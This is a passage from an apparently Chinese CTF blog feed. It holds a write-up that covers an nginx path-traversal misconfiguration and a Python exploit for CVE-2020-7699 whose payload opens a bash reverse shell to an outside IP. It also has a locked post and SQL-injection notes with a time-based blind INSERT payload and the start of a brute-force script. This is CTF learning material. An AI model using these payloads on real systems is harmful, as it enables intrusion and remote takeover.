class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">main                                # å…¨å±€é…ç½®</span><br><span class="line"> </span><br><span class="line">events &#123;                            # nginxå·¥ä½œæ¨¡å¼é…ç½®</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http &#123;                                # httpè®¾ç½®</span><br><span class="line">    ....</span><br><span class="line"> </span><br><span class="line">    server &#123;                        # æœåŠ¡å™¨ä¸»æœºé…ç½®</span><br><span class="line">        ....</span><br><span class="line">        location &#123;                    # è·¯ç”±é…ç½®</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location path &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location otherpath &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        ....</span><br><span class="line"> </span><br><span class="line">        location &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    upstream name &#123;                    # è´Ÿè½½å‡è¡¡é…ç½®</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ç›®å½•ç©¿è¶Šæ¼æ´å‚è€ƒ</p><p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p><p>/static../</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p><p>ä¹‹åå°±æ˜¯æ‰¾cveäº†ï¼Œæ¯”è¾ƒèœï¼Œåªèƒ½å­¦ä¹ </p><p>cve-2020-7699</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure><p>ä¹‹ååå¼¹shellï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Hitcon2017-babyfirst-reveng&quot;&gt;&lt;a href=&quot;#Hitcon2017-babyfirst-reveng&quot; class=&quot;headerlink&quot; title=&quot;Hitcon2017 babyfirst</summary>
      
    
    
    
    <category term="CTF" scheme="https://pz1o.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Flag</title>
    <link href="https://pz1o.top/2099/09/27/Flag/"/>
    <id>https://pz1o.top/2099/09/27/Flag/</id>
    <published>2099-09-27T15:15:44.000Z</published>
    <updated>2020-11-20T14:18:50.571Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Welcome to my blog, enter password to read.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SQLæ³¨å…¥</title>
    <link href="https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2020-12-09T15:38:24.000Z</published>
    <updated>2020-12-09T15:39:32.233Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘å°±å•çº¯æƒ³æŠŠè¿™äº›ä¸œè¥¿å­˜ä¸‹æ¥</p><h1 id="åŸºç¡€å­¦ä¹ "><a href="#åŸºç¡€å­¦ä¹ " class="headerlink" title="åŸºç¡€å­¦ä¹ "></a>åŸºç¡€å­¦ä¹ </h1><h2 id="1-SQLæ³¨å…¥çš„åˆ†ç±»"><a href="#1-SQLæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="1.SQLæ³¨å…¥çš„åˆ†ç±»"></a>1.SQLæ³¨å…¥çš„åˆ†ç±»</h2><ul><li><h3 id="åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"><a href="#åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”" class="headerlink" title="åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”"></a>åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº”</h3><ul><li><h4 id="åŸºäºé”™è¯¯çš„SQLæ³¨å…¥"><a href="#åŸºäºé”™è¯¯çš„SQLæ³¨å…¥" class="headerlink" title="åŸºäºé”™è¯¯çš„SQLæ³¨å…¥"></a>åŸºäºé”™è¯¯çš„SQLæ³¨å…¥</h4></li><li><h4 id="è”åˆæŸ¥è¯¢çš„ç±»å‹"><a href="#è”åˆæŸ¥è¯¢çš„ç±»å‹" class="headerlink" title="è”åˆæŸ¥è¯¢çš„ç±»å‹"></a>è”åˆæŸ¥è¯¢çš„ç±»å‹</h4></li><li><h4 id="å †æŸ¥è¯¢æ³¨å°„"><a href="#å †æŸ¥è¯¢æ³¨å°„" class="headerlink" title="å †æŸ¥è¯¢æ³¨å°„"></a>å †æŸ¥è¯¢æ³¨å°„</h4></li><li><h4 id="SQLç›²æ³¨"><a href="#SQLç›²æ³¨" class="headerlink" title="SQLç›²æ³¨"></a>SQLç›²æ³¨</h4><ul><li><h5 id="åŸºäºå¸ƒå°”SQLç›²æ³¨"><a href="#åŸºäºå¸ƒå°”SQLç›²æ³¨" class="headerlink" title="åŸºäºå¸ƒå°”SQLç›²æ³¨"></a>åŸºäºå¸ƒå°”SQLç›²æ³¨</h5></li><li><h5 id="åŸºäºæ—¶é—´çš„SQLç›²æ³¨"><a href="#åŸºäºæ—¶é—´çš„SQLç›²æ³¨" class="headerlink" title="åŸºäºæ—¶é—´çš„SQLç›²æ³¨"></a>åŸºäºæ—¶é—´çš„SQLç›²æ³¨</h5></li><li><h5 id="åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"><a href="#åŸºäºæŠ¥é”™çš„SQLç›²æ³¨" class="headerlink" title="åŸºäºæŠ¥é”™çš„SQLç›²æ³¨"></a>åŸºäºæŠ¥é”™çš„SQLç›²æ³¨</h5></li></ul></li></ul></li></ul><ul><li><h3 id="åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢"><a href="#åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢" class="headerlink" title="åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢"></a>åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢</h3><ul><li><h5 id="åŸºäºå­—ç¬¦ä¸²"><a href="#åŸºäºå­—ç¬¦ä¸²" class="headerlink" title="åŸºäºå­—ç¬¦ä¸²"></a>åŸºäºå­—ç¬¦ä¸²</h5></li><li><h5 id="æ•°å­—æˆ–æ•´æ•°"><a href="#æ•°å­—æˆ–æ•´æ•°" class="headerlink" title="æ•°å­—æˆ–æ•´æ•°"></a>æ•°å­—æˆ–æ•´æ•°</h5></li></ul></li><li><h3 id="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥"><a href="#åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥" class="headerlink" title="åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥"></a>åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥</h3><ul><li><h5 id="ä¸€é˜¶æ³¨å°„"><a href="#ä¸€é˜¶æ³¨å°„" class="headerlink" title="ä¸€é˜¶æ³¨å°„"></a>ä¸€é˜¶æ³¨å°„</h5></li><li><h5 id="äºŒé˜¶æ³¨å°„"><a href="#äºŒé˜¶æ³¨å°„" class="headerlink" title="äºŒé˜¶æ³¨å°„"></a>äºŒé˜¶æ³¨å°„</h5></li></ul></li><li><h3 id="åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„"><a href="#åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„" class="headerlink" title="åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„"></a>åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„</h3><ul><li><h5 id="é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„"><a href="#é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„" class="headerlink" title="é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„"></a>é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„</h5></li><li><h5 id="é€šè¿‡cookieæ³¨å°„"><a href="#é€šè¿‡cookieæ³¨å°„" class="headerlink" title="é€šè¿‡cookieæ³¨å°„"></a>é€šè¿‡cookieæ³¨å°„</h5></li><li><h5 id="é€šè¿‡æœåŠ¡å™¨å˜é‡"><a href="#é€šè¿‡æœåŠ¡å™¨å˜é‡" class="headerlink" title="é€šè¿‡æœåŠ¡å™¨å˜é‡"></a>é€šè¿‡æœåŠ¡å™¨å˜é‡</h5></li></ul></li></ul><h2 id="2-åŸºç¡€å‡½æ•°ä¸é€»è¾‘"><a href="#2-åŸºç¡€å‡½æ•°ä¸é€»è¾‘" class="headerlink" title="2.åŸºç¡€å‡½æ•°ä¸é€»è¾‘"></a>2.åŸºç¡€å‡½æ•°ä¸é€»è¾‘</h2><h3 id="1-åŸºç¡€å‡½æ•°"><a href="#1-åŸºç¡€å‡½æ•°" class="headerlink" title="1.åŸºç¡€å‡½æ•°"></a>1.åŸºç¡€å‡½æ•°</h3><p>â€‹    concat(str1,str2)   â€”â€”æ— åˆ†éš”è¿æ¥å­—ç¬¦ä¸²</p><p>â€‹    concat_ws(separator,str1,str2)   â€”â€”å«æœ‰åˆ†éš”ç¬¦è¿æ¥å­—ç¬¦ä¸²</p><p>â€‹    group_concat(str1,str2)  â€”â€”ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ï¼Œè¿æ¥ä¸€ä¸ªç»„çš„å­—ç¬¦ä¸²</p><h3 id="2-åŸºç¡€é€»è¾‘"><a href="#2-åŸºç¡€é€»è¾‘" class="headerlink" title="2.åŸºç¡€é€»è¾‘"></a>2.åŸºç¡€é€»è¾‘</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"select * from users where id='$id' limit 0,1"</span>;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„è€ƒè™‘ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯é—­åˆå‰é¢ä½ çš„ â€˜ å¦ä¸€ä¸ªæ˜¯å¤„ç†åé¢çš„ â€˜ ï¼Œä¸€èˆ¬é‡‡ç”¨ä¸¤ç§æ€è·¯ï¼Œé—­åˆåé¢çš„å¼•å·æˆ–è€…æ³¨é‡Šæ‰ï¼Œæ³¨é‡Šæ‰é‡‡ç”¨â€”+ æˆ–è€… #ï¼ˆ%23ï¼‰ã€‚</p><p>limit ä»0å¼€å§‹ï¼Œè‡³å°‘1ä¸ªæ•°æ®</p><p>limit 10  è‡³å°‘10ä¸ªæ•°æ®</p><h3 id="3-unionæ“ä½œç¬¦çš„ç”¨æ³•"><a href="#3-unionæ“ä½œç¬¦çš„ç”¨æ³•" class="headerlink" title="3.unionæ“ä½œç¬¦çš„ç”¨æ³•"></a>3.unionæ“ä½œç¬¦çš„ç”¨æ³•</h3><p>unionæ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªselectè¯­å¥çš„ç»“æœé›†ã€‚ä½†æ³¨æ„çš„æ˜¯ï¼Œselectçš„è¯­å¥å¿…é¡»æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼Œåˆ—ä¹Ÿæœ‰ç›¸åŒçš„ç±»å‹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_names <span class="keyword">from</span> table_name1 <span class="keyword">union</span> <span class="keyword">select</span> column_names <span class="keyword">from</span> table_name2;</span><br></pre></td></tr></table></figure><h3 id="4-ä¸€èˆ¬æ“ä½œ"><a href="#4-ä¸€èˆ¬æ“ä½œ" class="headerlink" title="4.ä¸€èˆ¬æ“ä½œ"></a>4.ä¸€èˆ¬æ“ä½œ</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema; //è¿›å…¥ç³»ç»Ÿæ•°æ®åº“</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>; </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'myclass'</span>; //æœç´¢å½“æ•°æ®åº“åä¸ºmyclassä¸­å„è¡¨çš„åå­—</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502160256194.png" alt="image-20200502160256194"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; //çŒœæ•°æ®åº“</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'æ•°æ®åº“å'</span>; //çŒœæŸåº“çš„æ•°æ®è¡¨</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">form</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'è¡¨å'</span>; //çŒœæŸè¡¨çš„æ•°æ®æ®µ</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> *; //çŒœæ•°æ®æ®µçš„å†…å®¹</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/image-20200502161927164_WPS%E5%9B%BE%E7%89%87.png" alt="image-20200502161927164_WPSå›¾ç‰‡"></p><h2 id="3-ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰"><a href="#3-ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰" class="headerlink" title="3.ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰"></a>3.ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰</h2><h3 id="1-åŸºäºå¸ƒå°”çš„SQLç›²æ³¨"><a href="#1-åŸºäºå¸ƒå°”çš„SQLç›²æ³¨" class="headerlink" title="1.åŸºäºå¸ƒå°”çš„SQLç›²æ³¨"></a>1.åŸºäºå¸ƒå°”çš„SQLç›²æ³¨</h3><h3 id="2-åŸºäºæ—¶é—´çš„SQLç›²æ³¨"><a href="#2-åŸºäºæ—¶é—´çš„SQLç›²æ³¨" class="headerlink" title="2.åŸºäºæ—¶é—´çš„SQLç›²æ³¨"></a>2.åŸºäºæ—¶é—´çš„SQLç›²æ³¨</h3><p>æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨éå¸¸ç±»ä¼¼ï¼Œä½†æ—¶é—´ç›²æ³¨æ˜¯åˆ©ç”¨sleep()â€‹å’Œbenchmark()ç­‰å‡½æ•°è®©mysqlæ‰§è¡Œçš„æ—¶é—´å˜é•¿ã€‚</p><p>æ—¶é—´ç›²æ³¨å¤šä¸IF(expr1,expr2,expr3)ç»“åˆä½¿ç”¨ï¼Œå¦‚æœexpr1æ˜¯trueï¼Œåˆ™æ‰§è¡Œexpr2ï¼Œå¦åˆ™æ‰§è¡Œexpr3</p><h3 id="INSERT-INTOæ³¨å…¥-caseå»¶æ—¶ç›²æ³¨"><a href="#INSERT-INTOæ³¨å…¥-caseå»¶æ—¶ç›²æ³¨" class="headerlink" title="INSERT INTOæ³¨å…¥(caseå»¶æ—¶ç›²æ³¨)"></a>INSERT INTOæ³¨å…¥(caseå»¶æ—¶ç›²æ³¨)</h3><p>çœ‹äº†æºç çŸ¥é“å–xffå¤´,å¹¶ä¸”explodeè¿‡æ»¤é€—å·ã€‚é¢˜ç›®çš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];  &#x2F;&#x2F;è·å–è¯·æ±‚çš„ipåœ°å€</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;å°†é€—å·è¿‡æ»¤</span><br><span class="line">return $ip_arr[0]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ˜¯<strong>ç›²æ³¨</strong>é¢˜ç›®è¯´å¾—ä¹Ÿå¾ˆæ˜ç™½ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆæ³¨å…¥å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜</p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯ç†è§£<code>insert...into</code>æ³¨å…¥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip(ip) values (&#39;$ip&#39;);</span><br><span class="line">&#x2F;&#x2F;è¿™é‡Œä¸»è¦ç»“åˆsleep()è¿›è¡Œæ³¨å…¥</span><br><span class="line">insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))</span><br><span class="line">&#x2F;&#x2F;è¿™æ ·å°±æ’å…¥äº†ä¸€æ¡id&#x3D;1,name&#x3D;nullçš„æ•°æ®</span><br></pre></td></tr></table></figure><ul><li>ç¬¬äºŒä¸ªæ˜¯è¿‡æ»¤é€—å·çš„ï¼Œ<strong>æ‰€ä»¥ä¸èƒ½ç”¨<code>if(a,b,c)</code>åº”è¯¥ç”¨<code>case...when...then</code>åŒæ—¶å¸¸ç”¨çš„æˆªå–å­—ç¬¦ä¸²å‡½æ•°<code>substr([str],[start],[len])</code>ä¹Ÿæœ‰æ›¿ä»£çš„<code>substr([str]from [strat] for [len])</code></strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">case...when...then</span><br><span class="line">ç®€å•caseå‡½æ•°</span><br><span class="line">case sex when &#39;1&#39; then &#39;nan&#39;</span><br><span class="line">when &#39;2&#39; then &#39;nv&#39;</span><br><span class="line">else &#39;qita&#39; end</span><br><span class="line">caseæœç´¢å‡½æ•°</span><br><span class="line">case when sex &#x3D; &#39;1&#39; then &#39;nan&#39;</span><br><span class="line"> when sex &#x3D; &#39;2&#39; then &#39;nv</span><br><span class="line"> else &#39;qita&#39; end</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åªéœ€è¦æ„é€ å°±å¯ä»¥äº†ã€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;</span><br><span class="line">&#x2F;&#x2F;æœ€åä¸€ä¸ª)ç”¨æ¥é—­åˆ #ç”¨æ¥æ³¨é‡Š</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¯ä»¥å†™è„šæœ¬äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web15/"</span></span><br><span class="line">data = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        payload = <span class="string">"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#"</span>.format(i,j)</span><br><span class="line">        headers = &#123;<span 